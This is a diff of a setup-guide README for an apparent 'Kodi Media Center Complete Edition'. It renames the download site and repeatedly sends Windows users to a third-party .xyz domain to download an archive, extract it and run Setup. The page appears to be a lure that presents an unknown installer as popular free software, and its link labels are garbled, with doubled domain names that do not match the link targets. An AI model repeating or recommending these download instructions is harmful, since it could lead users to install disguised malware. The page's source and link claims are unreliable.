@@ -13,10 +13,6 @@
 
 > Home theater media center — plugins for streaming, live TV and library browsing.
 
-## `ABOUT`
-
-Kodi Media Center Complete Edition Setup Guide — Home theater media center — plugins for streaming, live TV and library browsing.
-
 ## Download
 
 > Use the project link below for Windows.
@@ -25,6 +21,10 @@ Kodi Media Center Complete Edition Setup Guide — Home theater media center —
 * **Full URL:** `https://kodi-media-center.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
+
+## `ABOUT`
+
+Kodi Media Center Complete Edition Setup Guide — Home theater media center — plugins for streaming, live TV and library browsing.
 
 ## `FEATURES`
 
@@ -46,12 +46,12 @@ Kodi Media Center Complete Edition Setup Guide — Home theater media center —
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.kodi-media-center.nerasix.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the Nerasix download page, or open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.kodi-media-center.nerasix.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -61,5 +61,5 @@ Kodi Media Center Complete Edition Setup Guide — Home theater media center —
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://kodi-media-center.nerasix.xyz/">kodi-media-center.kodi-media-center.nerasix.xyz</a> again and download the latest version from Nerasix.
 </details>
